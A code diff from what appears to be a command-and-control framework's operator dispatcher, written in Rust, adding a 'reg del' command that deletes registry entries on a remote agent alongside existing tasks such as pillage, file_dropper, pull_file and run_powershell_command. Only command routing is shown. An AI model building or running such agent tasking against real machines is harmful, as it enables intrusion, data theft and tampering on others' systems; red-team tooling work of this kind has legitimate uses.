@@ -6,10 +6,10 @@ use crate::{
     models::AppState,
     net::{Credentials, IsTaskingAgent},
     tasks::task_impl::{
-        TaskDispatchError, change_directory, clear_terminal, copy_file, dir_listing, file_dropper,
-        kill_agent, kill_process, list_processes, move_file, pillage, pull_file, pwd, reg_add,
-        reg_query, remove_agent, run_powershell_command, set_sleep, show_help,
-        show_help_for_command, show_server_time, unknown_command,
+        RegOperationDelQuery, TaskDispatchError, change_directory, clear_terminal, copy_file,
+        dir_listing, file_dropper, kill_agent, kill_process, list_processes, move_file, pillage,
+        pull_file, pwd, reg_add, reg_query_del, remove_agent, run_powershell_command, set_sleep,
+        show_help, show_help_for_command, show_server_time, unknown_command,
     },
 };
 
@@ -72,8 +72,13 @@ async fn dispatcher(
         ["cp", _pat @ ..] | ["copy", _pat @ ..] => copy_file(raw_input, creds, &agent).await,
         ["mv", _pat @ ..] | ["move", _pat @ ..] => move_file(raw_input, creds, &agent).await,
         ["pull", _pat @ ..] => pull_file(raw_input, creds, &agent).await,
-        ["reg", "query", _pat @ ..] => reg_query(raw_input, creds, &agent).await,
+        ["reg", "query", _pat @ ..] => {
+            reg_query_del(raw_input, creds, &agent, RegOperationDelQuery::Query).await
+        }
         ["reg", "add", _pat @ ..] => reg_add(raw_input, creds, &agent).await,
+        ["reg", "del", _pat @ ..] => {
+            reg_query_del(raw_input, creds, &agent, RegOperationDelQuery::Delete).await
+        }
         _ => unknown_command(),
     }
 }
